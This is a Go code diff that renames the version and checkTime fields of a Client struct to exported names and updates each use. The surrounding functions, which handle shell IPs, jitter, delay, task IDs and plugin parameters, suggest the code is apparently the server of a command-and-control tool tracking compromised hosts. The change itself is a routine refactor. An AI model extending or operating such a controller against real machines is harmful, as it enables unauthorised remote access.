@@ -4008,7 +4008,7 @@ func GetMsg(uid, uidBytes string) string {
 		for i := range client_data.Clients {
 			client := &client_data.Clients[i]
 			if client.Uid == uid {
-				client.checkTime = formattedTime
+				client.CheckTime = formattedTime
 				break
 			}
 		}
@@ -4216,7 +4216,7 @@ func Getcmd(uid, cmd, Taskid, port string) string {
 			for i := range client_data.Clients {
 				client := &client_data.Clients[i]
 				if client.Uid == uid {
-					client.version = version
+					client.Version = version
 					break
 				}
 			}
@@ -4731,9 +4731,9 @@ func UserIndex() []EnrichedClient {
 			ExternalIP:      client.ExternalIP,
 			LocalIP:         client.LocalIP,
 			CurrentDir:      client.CurrentDir,
-			Version:         client.version,
+			Version:         client.Version,
 			Remarks:         client.Remarks,
-			CheckTime:       client.checkTime,
+			CheckTime:       client.CheckTime,
 			Uid:             client.Uid,
 			Server:          client.Server,
 			PluginParameter: pluginParamMap,
@@ -4777,9 +4777,9 @@ func updateIndex(uid string) *EnrichedClient {
 		ExternalIP:      clientCopy.ExternalIP,
 		LocalIP:         clientCopy.LocalIP,
 		CurrentDir:      clientCopy.CurrentDir,
-		Version:         clientCopy.version,
+		Version:         clientCopy.Version,
 		Remarks:         clientCopy.Remarks,
-		CheckTime:       clientCopy.checkTime,
+		CheckTime:       clientCopy.CheckTime,
 		Uid:             clientCopy.Uid,
 		Server:          clientCopy.Server,
 		PluginParameter: pluginParamMap,
@@ -5814,9 +5814,9 @@ type Client struct {
 	ExternalIP string `json:"external_ip"`
 	LocalIP    string `json:"local_ip"`
 	CurrentDir string `json:"currentDir"`
-	version    string `json:"version"`
+	Version    string `json:"version"`
 	Remarks    string `json:"Remarks"`
-	checkTime  string `json:"checkTime"`
+	CheckTime  string `json:"checkTime"`
 	Uid        string `json:"uid"`
 	Server     string `json:"server"`
 	Proto      string `json:"proto"`
@@ -6106,7 +6106,7 @@ func put_client(username, host, osType, online_time, shell_ip, currentDir, versi
 		ExternalIP: shell_ip,
 		LocalIP:    innet_ip,
 		CurrentDir: currentDir,
-		version:    version,
+		Version:    version,
 		Remarks:    Remarks,
 		Uid:        uid,
 		Server:     server_remark,
@@ -6122,9 +6122,9 @@ func put_client(username, host, osType, online_time, shell_ip, currentDir, versi
 			client.LocalIP = innet_ip
 			client.Delay = _delay
 			client.CurrentDir = currentDir
-			client.version = version
+			client.Version = version
 			client.Remarks = Remarks
-			client.checkTime = online_time
+			client.CheckTime = online_time
 			client.Server = server_remark
 			client.Jitter = jitter
 			client.Executable = executable
